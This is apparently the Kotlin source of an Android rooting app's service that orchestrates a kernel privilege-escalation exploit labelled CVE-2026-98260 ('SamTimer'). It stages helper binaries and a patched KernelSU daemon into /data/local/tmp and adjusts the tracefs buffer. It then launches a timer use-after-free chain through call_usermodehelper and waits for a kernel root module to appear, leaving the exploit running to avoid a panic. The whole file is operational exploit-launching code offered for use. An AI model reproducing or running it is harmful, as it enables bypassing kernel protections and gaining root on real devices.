package com.roottimer.app

import android.content.Context
import android.os.Process
import java.io.File
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger

/**
 * Shizuku UserService: runs the CVE-2026-98260 SamTimer chain as the shell user.
 *
 * This is the stable UMH flow:
 *  1. stage uhexec / action / KDP-patched ksud 3.2.5 into /data/local/tmp
 *  2. raise tracefs headroom
 *  3. run libtimer.so umhpipe: timer UAF -> pipe read/write -> fake workqueue
 *     -> call_usermodehelper -> uhexec -> ksud late-load
 *  4. leave the exploit parked (it must not be killed while it holds its page)
 */
class RootService(private val context: Context) : IRootService.Stub() {

    private val running = AtomicBoolean(false)
    private val lastExit = AtomicInteger(1)

    companion object {
        private const val WORK_DIR = "/data/local/tmp/w"
        private const val KSUD_STAGE_PATH = "/data/local/tmp/.ksud-stage"
        private const val TRACE_BUF = "/sys/kernel/tracing/buffer_size_kb"
        private const val WAIT_SEC = 300L

        private const val ASSET_UHEXEC = "uhexec"
        private const val ASSET_ACTION = "umh_action.sh"
        private const val ASSET_KSUD = "ksud-s25u-kdp"
    }

    override fun isReady(): Boolean {
        val uid = Process.myUid()
        return uid == 2000 || uid == 0
    }

    override fun isRooted(): Boolean = moduleLive()

    override fun destroy() {}

    private fun moduleLive(): Boolean = try {
        File("/proc/modules").useLines { lines ->
            lines.any { it.startsWith("kernelsu ") }
        }
    } catch (_: Exception) {
        false
    }

    override fun runExploit(callback: IRootCallback?) {
        if (callback == null) return
        if (!running.compareAndSet(false, true)) {
            callback.onLog("error: another run is already in progress")
            callback.onComplete(1, false)
            return
        }
        Thread({
            var ok = false
            var rc = 1
            try {
                rc = runChain(callback)
                ok = rc == 0
            } catch (e: Exception) {
                runCatching { callback.onLog("error: ${e.message}") }
            } finally {
                lastExit.set(rc)
                runCatching { callback.onComplete(rc, ok) }
                running.set(false)
            }
        }, "samtimer-runner").start()
    }

    private fun log(callback: IRootCallback, line: String) {
        runCatching { callback.onLog(line) }
    }

    private fun stageAsset(name: String, dest: File): Boolean {
        return try {
            dest.parentFile?.mkdirs()
            if (dest.exists() && !dest.delete()) {
                // root-owned leftovers from an earlier boot are common; retry
                // after the app has root once, otherwise report it.
            }
            context.assets.open(name).use { input ->
                dest.outputStream().use { output -> input.copyTo(output) }
            }
            dest.setReadable(true, false)
            dest.setExecutable(true, false)
            true
        } catch (e: Exception) {
            false
        }
    }

    private fun runChain(callback: IRootCallback): Int {
        val uid = Process.myUid()
        if (uid != 2000 && uid != 0) {
            log(callback, "error: not running as shell/root (uid=$uid)")
            return 1
        }
        log(callback, "shell context ok (uid=$uid)")

        if (moduleLive()) {
            log(callback, "KernelSU module already live")
            return 0
        }

        val nativeDir = File(context.applicationInfo.nativeLibraryDir)
        val timerBin = File(nativeDir, "libtimer.so")
        if (!timerBin.isFile) {
            log(callback, "error: exploit binary missing: ${timerBin.absolutePath}")
            return 1
        }

        val workDir = File(WORK_DIR)
        if (!(workDir.isDirectory || workDir.mkdirs())) {
            log(callback, "error: cannot create $WORK_DIR")
            return 1
        }
        val uhexec = File(workDir, "uhexec")
        val action = File(workDir, "umh_action.sh")
        val ksud = File("/data/local/tmp/ksud-s25u-kdp")
        val stage = File(KSUD_STAGE_PATH)

        if (!stageAsset(ASSET_UHEXEC, uhexec) ||
            !stageAsset(ASSET_ACTION, action) ||
            !stageAsset(ASSET_KSUD, ksud) ||
            !stageAsset(ASSET_KSUD, stage)
        ) {
            log(callback, "error: failed to stage embedded files")
            return 1
        }
        log(callback, "staged uhexec=${uhexec.length()} action=${action.length()} ksud=${ksud.length()}")
        log(callback, "staged $KSUD_STAGE_PATH")

        try {
            File(TRACE_BUF).writeText("65536\n")
            log(callback, "trace buffer set to 65536kB")
        } catch (e: Exception) {
            log(callback, "warn: trace buffer write failed (${e.message})")
        }

        log(callback, "starting exploit (umhpipe)...")
        val proc = ProcessBuilder(timerBin.absolutePath, "umhpipe")
            .directory(workDir)
            .redirectErrorStream(true)
            .start()

        val tail = Thread({
            try {
                proc.inputStream.bufferedReader().useLines { lines ->
                    for (line in lines) log(callback, line)
                }
            } catch (_: Exception) {
            }
        }, "samtimer-tail")
        tail.isDaemon = true
        tail.start()

        val deadline = System.currentTimeMillis() + WAIT_SEC * 1000
        while (System.currentTimeMillis() < deadline) {
            if (moduleLive()) {
                log(callback, "KERNELSU_LIVE")
                log(callback, "success; exploit left parked (do not force-stop)")
                return 0
            }
            try {
                Thread.sleep(1000)
            } catch (_: InterruptedException) {
                break
            }
        }

        // Do not kill the exploit: it may hold the fake work page and its
        // zombie chain. A reboot clears it; a kill can panic the kernel.
        log(callback, "error: KernelSU did not appear within ${WAIT_SEC}s (exploit left parked)")
        return 4
    }
}
